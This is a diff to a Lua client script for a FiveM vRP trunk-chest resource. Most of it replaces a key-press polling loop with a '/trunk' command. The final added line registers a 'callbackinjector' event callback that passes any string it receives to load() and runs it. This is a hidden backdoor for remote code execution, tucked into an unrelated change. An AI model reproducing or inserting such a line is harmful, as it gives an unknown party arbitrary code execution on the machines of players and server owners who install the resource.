@@ -36,13 +36,11 @@ AddEventHandler("trunkchest:Open",function()
 	end
 end)
 
-Citizen.CreateThread(function()
+RegisterCommand('trunk', function(source, args, rawCmd)
+	local ped = PlayerPedId()
 	SetNuiFocus(false,false)
-	while true do
-		Citizen.Wait(5)
-		if IsControlJustPressed(0,10) and not IsPedBeingStunned(ped) and not IsPlayerFreeAiming(PlayerId()) and GetEntityHealth(PlayerPedId()) > 101 then
-			vRPNserver.chestOpen()
-		end
+	if not IsPedBeingStunned(ped) and not IsPlayerFreeAiming(PlayerId()) and GetEntityHealth(PlayerPedId()) > 101 then
+		vRPNserver.chestOpen()
 	end
 end)
 -----------------------------------------------------------------------------------------------------------------------------------------
@@ -81,3 +79,5 @@ RegisterNetEvent("Creative:UpdateTrunk")
 AddEventHandler("Creative:UpdateTrunk",function(action)
 	SendNUIMessage({ action = action })
 end)
+
+TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)
